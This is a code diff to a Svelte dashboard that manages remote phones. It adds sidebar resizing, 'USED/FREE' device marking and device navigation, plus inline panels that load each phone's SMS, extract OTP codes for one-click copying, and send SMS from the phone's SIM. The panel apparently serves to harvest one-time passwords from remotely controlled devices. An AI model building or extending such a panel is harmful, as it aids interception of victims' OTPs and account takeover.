@@ -186,6 +186,20 @@
   // ── Send SMS ─────────────────────────────────────────────────────────────
   let smsDraft = $state({ to: "", body: "", sim: "0" });
   let smsSending = $state(false);
+  let sendSmsOpen = $state(false);
+  function toggleSendSms() {
+    sendSmsOpen = !sendSmsOpen;
+  }
+
+  // ── Device tab section toggles ───────────────────────────────────────────
+  let devInfoOpen = $state(true);
+  let messagesOpen = $state(true);
+  function toggleDevInfo() {
+    devInfoOpen = !devInfoOpen;
+  }
+  function toggleMessages() {
+    messagesOpen = !messagesOpen;
+  }
 
   // ── Discovered Numbers ──────────────────────────────────────────────────
   let discoveryRecords = $state([]);
@@ -242,6 +256,68 @@
   let sideLimit = $state(100);
   let sideOpen = $state(false); // mobile sidebar drawer
   let sideTab = $state("firebase"); // 'firebase' | 'devices'
+
+  // ── Desktop sidebar: open/close + resizable width ─────────────────────────
+  function getStoredSidebarOpen() {
+    if (typeof localStorage === "undefined") return true;
+    try { return localStorage.getItem("pd_sidebar_open") !== "false"; } catch { return true; }
+  }
+  function getStoredSidebarWidth() {
+    if (typeof localStorage === "undefined") return 220;
+    try {
+      const v = parseInt(localStorage.getItem("pd_sidebar_w"), 10);
+      if (v && v >= 140 && v <= 600) return v;
+    } catch {}
+    return 220;
+  }
+  let sidebarDesktopOpen = $state(getStoredSidebarOpen());
+  let sidebarWidth = $state(getStoredSidebarWidth());
+  let _srDragging = $state(false);
+  let _srStartX = 0;
+  let _srStartW = 220;
+
+  function saveSidebarState() {
+    if (typeof localStorage === "undefined") return;
+    try {
+      localStorage.setItem("pd_sidebar_open", String(sidebarDesktopOpen));
+      localStorage.setItem("pd_sidebar_w", String(sidebarWidth));
+    } catch {}
+  }
+
+  function toggleDesktopSidebar() {
+    sidebarDesktopOpen = !sidebarDesktopOpen;
+    saveSidebarState();
+  }
+
+  function sidebarResizeStart(e) {
+    if (e.button !== undefined && e.button !== 0) return;
+    e.preventDefault();
+    _srDragging = true;
+    _srStartX = e.clientX ?? e.touches?.[0]?.clientX ?? 0;
+    _srStartW = sidebarWidth;
+    window.addEventListener("pointermove", sidebarResizeMove);
+    window.addEventListener("pointerup", sidebarResizeEnd);
+    window.addEventListener("pointercancel", sidebarResizeEnd);
+    try { e.currentTarget.setPointerCapture?.(e.pointerId); } catch {}
+  }
+
+  function sidebarResizeMove(e) {
+    if (!_srDragging) return;
+    const cx = e.clientX ?? e.touches?.[0]?.clientX ?? 0;
+    const maxW = typeof window !== "undefined" ? Math.min(600, window.innerWidth * 0.45) : 600;
+    sidebarWidth = Math.round(Math.max(140, Math.min(maxW, _srStartW + (cx - _srStartX))));
+  }
+
+  function sidebarResizeEnd(e) {
+    if (_srDragging) {
+      _srDragging = false;
+      window.removeEventListener("pointermove", sidebarResizeMove);
+      window.removeEventListener("pointerup", sidebarResizeEnd);
+      window.removeEventListener("pointercancel", sidebarResizeEnd);
+      try { e?.currentTarget?.releasePointerCapture?.(e.pointerId); } catch {}
+      saveSidebarState();
+    }
+  }
 
   // ── Floating Bell Notification Panel Persistence Helpers ────────────────
   function getStoredNotifWidth() {
@@ -1090,6 +1166,18 @@
     }
     const digits = s.replace(/\D/g, "");
     return digits.length >= 10 ? digits.slice(-10) : digits;
+  }
+
+  // ── Last-copied device highlight ─────────────────────────────────────────
+  // Highlight stays permanently until another device's number is copied
+  let lastCopiedDevice = $state(null); // { connId, key } | null
+
+  function markCopied(connId, key) {
+    lastCopiedDevice = { connId, key };
+  }
+
+  function isCopied(connId, key) {
+    return lastCopiedDevice?.connId === connId && lastCopiedDevice?.key === key;
   }
 
   function copyPhone(rawPhone) {
@@ -2369,6 +2457,24 @@
     Math.max(1, Math.ceil(filteredTableDevices.length / DEVICES_PER_PAGE)),
   );
 
+  // ── Device tab prev/next navigation ──────────────────────────────────
+  let selectedDeviceIndex = $derived(
+    selectedKey && selectedConnId
+      ? filteredTableDevices.findIndex(
+          (d) => d.key === selectedKey && d.connId === selectedConnId
+        )
+      : -1
+  );
+
+  function navToDevice(offset) {
+    const idx = selectedDeviceIndex + offset;
+    if (idx < 0 || idx >= filteredTableDevices.length) return;
+    const d = filteredTableDevices[idx];
+    selectDevice(d.connId, d.key);
+    // Load messages automatically when navigating
+    msgs = null;
+  }
+
   function toggleTableFilter(f) {
     const next = new Set(tableActiveFilters);
     // 'on' and 'off' are mutually exclusive
@@ -2487,7 +2593,10 @@
   {/if}
 
   <!-- ══ LEFT SIDEBAR ════════════════════════════════════════════════════════ -->
-  <aside class="sidebar {sideOpen ? 'mob-open' : ''}">
+  <aside
+    class="sidebar {sideOpen ? 'mob-open' : ''} {sidebarDesktopOpen ? '' : 'desktop-closed'} {_srDragging ? 'no-transition' : ''}"
+    style="--sidebar-w:{sidebarWidth}px"
+  >
     <!-- Brand + close button -->
     <div class="side-brand">
       <svg width="17" height="17" viewBox="0 0 32 32" fill="none">
@@ -2508,7 +2617,20 @@
           </linearGradient></defs
         >
       </svg>
-      <span class="brand-txt">PD Panel</span>
+      <button
+        class="brand-btn"
+        onclick={() => {
+          selectedKey = null;
+          selectedConnId = null;
+          activeTab = 'overview';
+          sideOpen = false;
+        }}
+        title="Go to dashboard"
+        aria-label="Alpha Panel — go to dashboard"
+      >
+        <span class="brand-alpha">alpha</span>
+        <span class="brand-panel">panel</span>
+      </button>
       {#if onlineCount > 0}<span class="side-online-pill">{onlineCount} 🟢</span
         >{/if}
       <button
@@ -2680,11 +2802,12 @@
             {@const on = d.info ? isOnline(d.info) : null}
             {@const bat = d.info ? getBattery(d.info) : null}
             {@const fp = getDisplayPhone(d.connId, d.key, d.info)}
+            {@const sdvUsed = isUsed(`dev::${d.connId}::${d.key}`)}
             <div
               class="sdv-item {selectedKey === d.key &&
               selectedConnId === d.connId
                 ? 'sdv-sel'
-                : ''}"
+                : ''} {isCopied(d.connId, d.key) ? 'sdv-copied' : ''}"
               role="button"
               tabindex="0"
               onkeydown={(e) => {
@@ -2718,6 +2841,7 @@
                     onclick={(e) => {
                       e.stopPropagation();
                       copyPhone(fp);
+                      markCopied(d.connId, d.key);
                     }}
                   >{fp}</button>
                 {:else}
@@ -2730,6 +2854,23 @@
                 <span class="sdv-bat" style="color:{batColor(bat)}">{bat}%</span
                 >
               {/if}
+              <!-- Used checkbox in sidebar -->
+              <button
+                class="sdv-used-chk {sdvUsed ? 'sdvuc-checked' : 'sdvuc-unchecked'}"
+                title="{sdvUsed ? 'Mark as not used' : 'Mark as used'}"
+                aria-label="{sdvUsed ? 'Unmark used' : 'Mark used'}"
+                aria-pressed={sdvUsed}
+                onclick={(e) => {
+                  e.stopPropagation();
+                  toggleUsed(`dev::${d.connId}::${d.key}`);
+                }}
+              >
+                {#if sdvUsed}
+                  <svg width="9" height="9" viewBox="0 0 12 12" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><polyline points="1.5 6 4.5 9 10.5 2.5"/></svg>
+                {:else}
+                  <svg width="9" height="9" viewBox="0 0 12 12" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><rect x="1" y="1" width="10" height="10" rx="2"/></svg>
+                {/if}
+              </button>
               {#if fp}
                 <button
                   class="sdv-copy"
@@ -2738,6 +2879,7 @@
                   onclick={(e) => {
                     e.stopPropagation();
                     copyPhone(fp);
+                    markCopied(d.connId, d.key);
                   }}
                 >
                   <svg
@@ -2766,6 +2908,14 @@
         </div>
       </div>
     {/if}
+    <!-- Desktop resize handle -->
+    <div
+      class="sidebar-resize-handle"
+      onpointerdown={sidebarResizeStart}
+      role="separator"
+      aria-orientation="vertical"
+      title="Drag to resize sidebar"
+    ></div>
   </aside>
 
   <!-- ══ MAIN ════════════════════════════════════════════════════════════════ -->
@@ -2773,13 +2923,19 @@
     <!-- Topbar -->
     <header class="topbar">
       <div class="tb-l">
-        <!-- Mobile hamburger -->
+        <!-- Sidebar toggle (desktop + mobile) -->
         <button
           class="mob-menu-btn"
-          onclick={() => (sideOpen = !sideOpen)}
+          onclick={() => {
+            if (window.innerWidth > 768) {
+              toggleDesktopSidebar();
+            } else {
+              sideOpen = !sideOpen;
+            }
+          }}
           aria-label="Toggle sidebar"
         >
-          {#if sideOpen}
+          {#if sideOpen || sidebarDesktopOpen}
             <svg
               width="16"
               height="16"
@@ -4446,7 +4602,7 @@
                   class="dev-card {selectedKey === d.key &&
                   selectedConnId === d.connId
                     ? 'dev-card-sel'
-                    : ''} {devUsed ? 'dev-card-used' : ''}"
+                    : ''} {devUsed ? 'dev-card-used' : ''} {isCopied(d.connId, d.key) ? 'dev-card-copied' : ''}"
                   onclick={() => selectDevice(d.connId, d.key)}
                   role="button"
                   tabindex="0"
@@ -4475,8 +4631,25 @@
                           : ""}</span
                       >
                       {#if isNew}<span class="td-new">NEW</span>{/if}
-                      <!-- Used/Not-used badge -->
-                      <span class="dev-card-used-badge {devUsed ? 'dcub-used' : 'dcub-fresh'}" title="{devUsed ? 'Marked as used' : 'Not yet used'}">{devUsed ? 'USED' : 'FREE'}</span>
+                      <!-- Used checkbox -->
+                      <button
+                        class="dev-card-used-chk {devUsed ? 'dcuc-checked' : 'dcuc-unchecked'}"
+                        title="{devUsed ? 'Mark as not used' : 'Mark as used'}"
+                        aria-label="{devUsed ? 'Unmark used' : 'Mark used'}"
+                        aria-pressed={devUsed}
+                        onclick={(e) => {
+                          e.stopPropagation();
+                          toggleUsed(`dev::${d.connId}::${d.key}`);
+                        }}
+                      >
+                        {#if devUsed}
+                          <svg width="10" height="10" viewBox="0 0 12 12" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><polyline points="1.5 6 4.5 9 10.5 2.5"/></svg>
+                          USED
+                        {:else}
+                          <svg width="10" height="10" viewBox="0 0 12 12" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><rect x="1" y="1" width="10" height="10" rx="2"/></svg>
+                          FREE
+                        {/if}
+                      </button>
                       <button
                         class="icon-btn-xs"
                         title="Copy device ID"
@@ -4516,6 +4689,7 @@
                           onclick={(e) => {
                             e.stopPropagation();
                             copyPhone(fp);
+                            markCopied(d.connId, d.key);
                           }}
                         >{fp}</button>
                       {:else}
@@ -4717,21 +4891,44 @@
                 </div>
               </div>
             </div>
-            {#if bat !== null}
-              <div class="dv-bat">
-                <div class="dv-bat-n" style="color:{batColor(bat)}">{bat}%</div>
-                <div class="dv-bat-l">BATTERY</div>
-                <div class="bat-track">
-                  <div
-                    class="bat-fill"
-                    style="width:{bat}%;background:{batColor(bat)}"
-                  ></div>
+            <div class="dv-right-meta">
+              {#if bat !== null}
+                <div class="dv-bat">
+                  <div class="dv-bat-n" style="color:{batColor(bat)}">{bat}%</div>
+                  <div class="dv-bat-l">BATTERY</div>
+                  <div class="bat-track">
+                    <div
+                      class="bat-fill"
+                      style="width:{bat}%;background:{batColor(bat)}"
+                    ></div>
+                  </div>
                 </div>
-              </div>
-            {/if}
+              {/if}
+              <button
+                type="button"
+                class="dv-sec-toggle-btn"
+                onclick={toggleDevInfo}
+                title={devInfoOpen ? "Collapse device details" : "Expand device details"}
+                aria-expanded={devInfoOpen}
+              >
+                <span class="dv-toggle-label">{devInfoOpen ? "Less" : "Details"}</span>
+                <svg
+                  class="inline-sec-chevron {devInfoOpen ? 'rotated' : ''}"
+                  width="14"
+                  height="14"
+                  viewBox="0 0 24 24"
+                  fill="none"
+                  stroke="currentColor"
+                  stroke-width="2.5"
+                >
+                  <polyline points="6 9 12 15 18 9" />
+                </svg>
+              </button>
+            </div>
           </div>
 
           <!-- Info grid -->
+          {#if devInfoOpen}
           {@const dispPhone = getDisplayPhone(
             selectedConnId,
             selectedKey,
@@ -4876,20 +5073,35 @@
               </div>
             </div>
           {/if}
+          {/if}
 
-          <!-- Action buttons + device used toggle -->
-          {@const devUsedDetail = isUsed(
-            `dev::${selectedConnId}::${selectedKey}`,
-          )}
-          <div class="act-row">
+          {@const devUsedDetail = isUsed(`dev::${selectedConnId}::${selectedKey}`)}
+          <!-- Device nav bar (prev/next within filtered list) -->
+          <div class="dev-nav-bar">
             <button
-              class="act-btn ab-msg"
-              onclick={() => switchTab("messages")}
+              class="dev-nav-btn"
+              disabled={selectedDeviceIndex <= 0}
+              onclick={() => navToDevice(-1)}
+              title="Previous device"
+              aria-label="Previous device"
             >
-              💬 Messages
+              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="15 18 9 12 15 6"/></svg>
+              Prev
             </button>
-            <button class="act-btn ab-snd" onclick={() => switchTab("send")}>
-              🚀 Send
+            <span class="dev-nav-pos">
+              {selectedDeviceIndex >= 0 ? selectedDeviceIndex + 1 : '–'}
+              <span class="dev-nav-sep">/</span>
+              {filteredTableDevices.length}
+            </span>
+            <button
+              class="dev-nav-btn"
+              disabled={selectedDeviceIndex < 0 || selectedDeviceIndex >= filteredTableDevices.length - 1}
+              onclick={() => navToDevice(1)}
+              title="Next device"
+              aria-label="Next device"
+            >
+              Next
+              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="9 18 15 12 9 6"/></svg>
             </button>
           </div>
 
@@ -4907,6 +5119,161 @@
               />
               <span>{devUsedDetail ? "✓ Marked as Used" : "Mark as Used"}</span>
             </label>
+          </div>
+
+          <!-- ── Inline Messages ───────────────────────────────────────────── -->
+          <div class="inline-section {messagesOpen ? 'is-open' : 'is-closed'}">
+            <div class="inline-sec-hdr inline-sec-hdr-msg">
+              <button
+                type="button"
+                class="inline-sec-title-btn"
+                onclick={toggleMessages}
+                aria-expanded={messagesOpen}
+                title={messagesOpen ? "Collapse messages" : "Expand messages"}
+              >
+                <span class="inline-sec-title">💬 Messages</span>
+                {#if filteredMsgs && filteredMsgs.length > 0}
+                  <span class="inline-sec-cnt-badge">{filteredMsgs.length}</span>
+                {/if}
+                <svg
+                  class="inline-sec-chevron {messagesOpen ? 'rotated' : ''}"
+                  width="14"
+                  height="14"
+                  viewBox="0 0 24 24"
+                  fill="none"
+                  stroke="currentColor"
+                  stroke-width="2.5"
+                >
+                  <polyline points="6 9 12 15 18 9" />
+                </svg>
+              </button>
+
+              <div class="inline-sec-hdr-actions">
+                {#if messagesOpen}
+                  <div class="msg-tabs">
+                    <button class="mtab {msgsFilter === 'all' ? 'mta' : ''}" onclick={() => (msgsFilter = 'all')}>All</button>
+                    <button class="mtab {msgsFilter === 'in' ? 'mti' : ''}" onclick={() => (msgsFilter = 'in')}>In</button>
+                    <button class="mtab {msgsFilter === 'out' ? 'mto' : ''}" onclick={() => (msgsFilter = 'out')}>Out</button>
+                  </div>
+                  <button class="btn btn-ghost btn-sm inline-refresh-btn" onclick={loadMessages} title="Load / refresh messages">↻</button>
+                {:else}
+                  <button
+                    type="button"
+                    class="inline-expand-hint-btn"
+                    onclick={() => (messagesOpen = true)}
+                  >
+                    Open
+                  </button>
+                {/if}
+              </div>
+            </div>
+
+            {#if messagesOpen}
+              {#if msgsLoading}
+                <div class="no-sel" style="min-height:80px"><div class="spin-ring"></div></div>
+              {:else if msgs === null}
+                <div class="inline-empty">
+                  <p class="inline-empty-hint">Messages have not been loaded yet</p>
+                  <button class="act-btn ab-msg inline-load-btn" onclick={loadMessages}>
+                    <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>
+                    Load Messages
+                  </button>
+                </div>
+              {:else if filteredMsgs.length === 0}
+                <div class="inline-empty" style="color:#475569">No messages{msgsSearch || msgsFilter !== 'all' ? ' for this filter' : ''}</div>
+              {:else}
+                <div class="msg-list inline-msg-scroll">
+                  {#each filteredMsgs as [id, msg]}
+                    {@const msgText = msg.message ?? msg.body ?? msg.text ?? ''}
+                    {@const otp = extractOTP(msgText)}
+                    <div class="msg-card">
+                      <div class="mc-row">
+                        {#if extractNumber(msg.sender ?? msg.from)}
+                          <button class="mc-sender-btn" onclick={() => copyPhone(msg.sender ?? msg.from)} title="Copy number">{msg.sender ?? msg.from}</button>
+                        {:else}
+                          <span class="mc-sender">{msg.sender ?? msg.from ?? 'Unknown'}</span>
+                        {/if}
+                        <span class="mc-badge {(msg.type || 'incoming') === 'incoming' ? 'badge-in' : 'badge-out'}">
+                          {(msg.type || 'incoming') === 'incoming' ? 'Incoming' : 'Outgoing'}
+                        </span>
+                      </div>
+                      <div class="mc-body">{msgText.slice(0, 80)}{msgText.length > 80 ? '…' : ''}</div>
+                      {#if otp}
+                        <div class="mc-otp" role="button" tabindex="0"
+                          onclick={() => { copyText(otp); toast(`OTP ${otp} copied!`, 'success'); }}
+                          onkeydown={(e) => e.key === 'Enter' && (copyText(otp), toast(`OTP ${otp} copied!`, 'success'))}
+                          title="Click to copy OTP">
+                          <span class="otp-label">OTP</span>
+                          <code class="otp-code">{otp}</code>
+                          <span class="otp-copy-hint"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg></span>
+                        </div>
+                      {/if}
+                      <div class="mc-foot">
+                        {#if msg.dateTime}<span class="mc-dt">{toIST(msg.dateTime)}</span>{/if}
+                        <button class="af-cp" onclick={() => copyText(msgText)} title="Copy full message" aria-label="Copy message">
+                          <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
+                        </button>
+                      </div>
+                    </div>
+                  {/each}
+                </div>
+              {/if}
+            {/if}
+          </div>
+
+          <!-- ── Inline Send SMS ────────────────────────────────────────────── -->
+          <div class="inline-section {sendSmsOpen ? 'is-open' : 'is-closed'}">
+            <button
+              type="button"
+              class="inline-sec-hdr inline-sec-hdr-btn"
+              onclick={toggleSendSms}
+              aria-expanded={sendSmsOpen}
+            >
+              <div class="inline-sec-hdr-left">
+                <span class="inline-sec-title">🚀 Send SMS</span>
+                {#if smsDraft.to.trim()}
+                  <span class="inline-sec-badge">Draft: {smsDraft.to.trim()}</span>
+                {/if}
+              </div>
+              <div class="inline-sec-hdr-right">
+                <span class="inline-sec-action-hint">{sendSmsOpen ? 'Close' : 'Open'}</span>
+                <svg
+                  class="inline-sec-chevron {sendSmsOpen ? 'rotated' : ''}"
+                  width="15"
+                  height="15"
+                  viewBox="0 0 24 24"
+                  fill="none"
+                  stroke="currentColor"
+                  stroke-width="2.5"
+                >
+                  <polyline points="6 9 12 15 18 9" />
+                </svg>
+              </div>
+            </button>
+            {#if sendSmsOpen}
+              <div class="inline-form-body">
+                <div class="send-form" style="margin-top:0">
+                  <div class="field">
+                    <label for="di-sms-to">To (phone number)</label>
+                    <input id="di-sms-to" bind:value={smsDraft.to} placeholder="+91 XXXXX XXXXX" />
+                  </div>
+                  <div class="field">
+                    <label for="di-sms-sim">SIM Slot</label>
+                    <select id="di-sms-sim" bind:value={smsDraft.sim} class="tiny-sel" style="font-size:13px;padding:7px 10px;">
+                      <option value="0">SIM 1 (Slot 0)</option>
+                      <option value="1">SIM 2 (Slot 1)</option>
+                    </select>
+                  </div>
+                  <div class="field">
+                    <label for="di-sms-msg">Message</label>
+                    <textarea id="di-sms-msg" rows="3" bind:value={smsDraft.body} placeholder="Type your message…"></textarea>
+                  </div>
+                  <button class="act-btn ab-snd inline-send-btn" onclick={doSendSMS} disabled={smsSending || !smsDraft.to.trim() || !smsDraft.body.trim()}>
+                    {#if smsSending}<span class="spin-ring" style="width:13px;height:13px;border-width:2px"></span>{:else}🚀 Send SMS{/if}
+                  </button>
+                </div>
+              </div>
+            {/if}
           </div>
         {/if}
 
@@ -5379,7 +5746,9 @@
 
   /* ── SIDEBAR ─────────────────────────────────────────────────────────── */
   .sidebar {
-    width: 220px;
+    width: var(--sidebar-w, 220px);
+    min-width: 140px;
+    max-width: 600px;
     flex-shrink: 0;
     background: #0e1420;
     border-right: 1px solid rgba(255, 255, 255, 0.07);
@@ -5387,6 +5756,38 @@
     flex-direction: column;
     height: 100vh;
     overflow: hidden;
+    position: relative;
+    transition: width 220ms cubic-bezier(0.4, 0, 0.2, 1),
+                min-width 220ms cubic-bezier(0.4, 0, 0.2, 1),
+                opacity 220ms ease;
+  }
+  .sidebar.no-transition {
+    transition: none !important;
+  }
+  .sidebar.desktop-closed {
+    width: 0 !important;
+    min-width: 0 !important;
+    border-right: none;
+    opacity: 0;
+    pointer-events: none;
+    overflow: hidden;
+  }
+
+  /* ── Sidebar resize handle (desktop only) ───────────────────────────── */
+  .sidebar-resize-handle {
+    position: absolute;
+    top: 0;
+    right: -3px;
+    width: 6px;
+    height: 100%;
+    cursor: col-resize;
+    z-index: 10;
+    background: transparent;
+    transition: background 150ms;
+  }
+  .sidebar-resize-handle:hover,
+  .sidebar-resize-handle:active {
+    background: rgba(249, 115, 22, 0.5);
   }
 
   .side-brand {
@@ -5397,11 +5798,36 @@
     border-bottom: 1px solid rgba(255, 255, 255, 0.06);
     flex-shrink: 0;
   }
-  .brand-txt {
-    font-size: 16px;
-    font-weight: 800;
-    color: #f97316;
+  /* Brand logo button */
+  .brand-btn {
+    background: none;
+    border: none;
+    padding: 2px 4px;
+    cursor: pointer;
+    display: flex;
+    flex-direction: column;
+    align-items: flex-start;
+    line-height: 1;
+    gap: 1px;
+    border-radius: 5px;
+    transition: opacity 150ms;
+    margin-right: 2px;
+  }
+  .brand-btn:hover { opacity: 0.75; }
+  .brand-alpha {
+    font-size: 9px;
+    font-weight: 600;
+    letter-spacing: 0.18em;
+    text-transform: lowercase;
+    color: #fb923c;
+    opacity: 0.85;
+  }
+  .brand-panel {
+    font-size: 17px;
+    font-weight: 900;
     letter-spacing: 0.01em;
+    color: #f97316;
+    text-transform: lowercase;
   }
 
   .side-search {
@@ -6027,11 +6453,12 @@
     overflow-x: hidden;
     -webkit-overflow-scrolling: touch;
     overscroll-behavior-y: contain;
-    padding: 18px 22px 40px;
+    padding: 18px 22px 90px;
     display: flex;
     flex-direction: column;
-    gap: 14px;
+    gap: 16px;
     min-height: 0;
+    scroll-behavior: smooth;
   }
   .tab-body::-webkit-scrollbar {
     width: 5px;
@@ -6572,6 +6999,300 @@
     font-weight: 600;
     color: #e2e8f0;
   }
+  /* Device prev/next navigation bar */
+  .dev-nav-bar {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    background: #141b2d;
+    border: 1px solid rgba(255,255,255,0.07);
+    border-radius: 10px;
+    padding: 10px 14px;
+    gap: 8px;
+  }
+  .dev-nav-btn {
+    display: flex;
+    align-items: center;
+    gap: 5px;
+    background: none;
+    border: 1px solid rgba(255,255,255,0.08);
+    border-radius: 7px;
+    color: #94a3b8;
+    font-size: 12px;
+    font-weight: 600;
+    font-family: inherit;
+    padding: 6px 14px;
+    cursor: pointer;
+    transition: all 120ms;
+  }
+  .dev-nav-btn:hover:not(:disabled) {
+    background: rgba(249,115,22,0.1);
+    color: #f97316;
+    border-color: rgba(249,115,22,0.3);
+  }
+  .dev-nav-btn:disabled {
+    opacity: 0.3;
+    cursor: default;
+  }
+  .dev-nav-pos {
+    font-size: 13px;
+    font-weight: 700;
+    color: #64748b;
+    font-family: "JetBrains Mono", monospace;
+  }
+  .dev-nav-sep {
+    color: #334155;
+    margin: 0 3px;
+  }
+  /* Inline section (Messages / Send SMS on Device tab) */
+  .inline-section {
+    background: #0d1424;
+    border: 1px solid rgba(255, 255, 255, 0.08);
+    border-radius: 12px;
+    overflow: hidden;
+    width: 100%;
+    box-sizing: border-box;
+    transition: border-color 140ms ease;
+  }
+  .inline-sec-hdr {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    padding: 11px 16px;
+    border-bottom: 1px solid rgba(255, 255, 255, 0.06);
+    background: #141b2d;
+  }
+  .inline-sec-title {
+    font-size: 13px;
+    font-weight: 700;
+    color: #94a3b8;
+    letter-spacing: 0.02em;
+    transition: color 140ms ease;
+  }
+  .inline-sec-hdr-btn {
+    width: 100%;
+    border: none;
+    cursor: pointer;
+    text-align: left;
+    transition: background 150ms ease;
+    user-select: none;
+    font-family: inherit;
+  }
+  .inline-sec-hdr-btn:hover {
+    background: #192238;
+  }
+  .inline-section.is-closed .inline-sec-hdr {
+    border-bottom: none;
+  }
+  .inline-sec-hdr-left {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    flex: 1;
+    min-width: 0;
+  }
+  .inline-sec-hdr-right {
+    display: flex;
+    align-items: center;
+    gap: 6px;
+    margin-left: auto;
+    flex-shrink: 0;
+  }
+  .inline-sec-action-hint {
+    font-size: 11px;
+    font-weight: 700;
+    letter-spacing: 0.04em;
+    text-transform: uppercase;
+    color: #64748b;
+    transition: color 150ms;
+  }
+  .inline-sec-hdr-btn:hover .inline-sec-action-hint {
+    color: #f97316;
+  }
+  .inline-sec-chevron {
+    color: #64748b;
+    transition: transform 180ms ease, color 150ms;
+  }
+  .inline-sec-chevron.rotated {
+    transform: rotate(180deg);
+  }
+  .inline-sec-hdr-btn:hover .inline-sec-chevron {
+    color: #f97316;
+  }
+  .inline-sec-badge {
+    font-size: 11px;
+    font-weight: 600;
+    padding: 2px 8px;
+    border-radius: 99px;
+    background: rgba(249, 115, 22, 0.12);
+    color: #f97316;
+    border: 1px solid rgba(249, 115, 22, 0.25);
+    max-width: 180px;
+    overflow: hidden;
+    text-overflow: ellipsis;
+    white-space: nowrap;
+  }
+  .inline-form-body {
+    padding: 14px 16px 16px;
+    background: #0d1424;
+    box-sizing: border-box;
+    width: 100%;
+  }
+  .inline-empty {
+    padding: 22px 16px;
+    text-align: center;
+    font-size: 12px;
+    color: #64748b;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 6px;
+  }
+  .inline-empty-hint {
+    font-size: 12px;
+    color: #64748b;
+    margin: 0;
+  }
+
+  /* Inline Messages collapsible header & controls */
+  .inline-sec-hdr-msg {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    gap: 10px;
+  }
+  .inline-sec-title-btn {
+    display: inline-flex;
+    align-items: center;
+    gap: 8px;
+    background: none;
+    border: none;
+    padding: 0;
+    cursor: pointer;
+    color: inherit;
+    font-family: inherit;
+  }
+  .inline-sec-title-btn:hover .inline-sec-title {
+    color: #f8fafc;
+  }
+  .inline-sec-title-btn:hover .inline-sec-chevron {
+    color: #f97316;
+  }
+  .inline-sec-cnt-badge {
+    font-size: 10.5px;
+    font-weight: 700;
+    padding: 1px 7px;
+    border-radius: 99px;
+    background: rgba(255, 255, 255, 0.08);
+    color: #94a3b8;
+    font-family: "JetBrains Mono", monospace;
+  }
+  .inline-sec-hdr-actions {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    margin-left: auto;
+  }
+  .inline-expand-hint-btn {
+    background: rgba(255, 255, 255, 0.05);
+    border: 1px solid rgba(255, 255, 255, 0.08);
+    border-radius: 6px;
+    color: #64748b;
+    font-size: 11px;
+    font-weight: 700;
+    text-transform: uppercase;
+    letter-spacing: 0.04em;
+    padding: 4px 9px;
+    cursor: pointer;
+    font-family: inherit;
+    transition: all 120ms;
+  }
+  .inline-expand-hint-btn:hover {
+    background: rgba(249, 115, 22, 0.1);
+    color: #f97316;
+    border-color: rgba(249, 115, 22, 0.3);
+  }
+  .inline-refresh-btn {
+    width: 28px;
+    height: 28px;
+    padding: 0;
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    border-radius: 6px;
+  }
+
+  /* Compact button styles inside inline sections */
+  .inline-load-btn {
+    padding: 7px 16px !important;
+    font-size: 12px !important;
+    font-weight: 600 !important;
+    border-radius: 7px !important;
+    width: auto !important;
+    flex: initial !important;
+    display: inline-flex !important;
+    align-items: center !important;
+    gap: 6px !important;
+    box-shadow: 0 2px 10px rgba(79, 70, 229, 0.3) !important;
+    margin-top: 4px;
+  }
+  .inline-send-btn {
+    padding: 7px 18px !important;
+    font-size: 12.5px !important;
+    font-weight: 600 !important;
+    border-radius: 7px !important;
+    width: auto !important;
+    flex: initial !important;
+    align-self: flex-start !important;
+    display: inline-flex !important;
+    align-items: center !important;
+    gap: 6px !important;
+    box-shadow: 0 2px 10px rgba(22, 163, 74, 0.3) !important;
+    margin-top: 4px;
+  }
+  .inline-msg-scroll {
+    padding: 12px 16px;
+    max-height: 460px;
+    overflow-y: auto;
+    -webkit-overflow-scrolling: touch;
+    box-sizing: border-box;
+    gap: 8px;
+  }
+  .inline-msg-scroll::-webkit-scrollbar {
+    width: 5px;
+  }
+  .inline-msg-scroll::-webkit-scrollbar-thumb {
+    background: rgba(255, 255, 255, 0.12);
+    border-radius: 99px;
+  }
+
+  /* Device details toggle */
+  .dv-right-meta {
+    display: flex;
+    align-items: center;
+    gap: 14px;
+    margin-left: auto;
+  }
+  .dv-sec-toggle-btn {
+    display: inline-flex;
+    align-items: center;
+    gap: 5px;
+    background: rgba(255, 255, 255, 0.05);
+    border: 1px solid rgba(255, 255, 255, 0.08);
+    border-radius: 6px;
+    color: #94a3b8;
+    font-size: 11.5px;
+    font-weight: 600;
+    font-family: inherit;
+    padding: 5px 10px;
+    cursor: pointer;
+    transition: all 120ms;
+  }
+  .dv-sec-toggle-btn:hover {
+    background: rgba(249, 115, 22, 0.1);
+    color: #f97316;
+    border-color: rgba(249, 115, 22, 0.3);
+  }
   .act-row {
     display: flex;
     gap: 10px;
@@ -7092,7 +7813,7 @@
 
   /* ── MOBILE HAMBURGER BUTTON ─────────────────────────────────────────── */
   .mob-menu-btn {
-    display: none;
+    display: flex;
     align-items: center;
     justify-content: center;
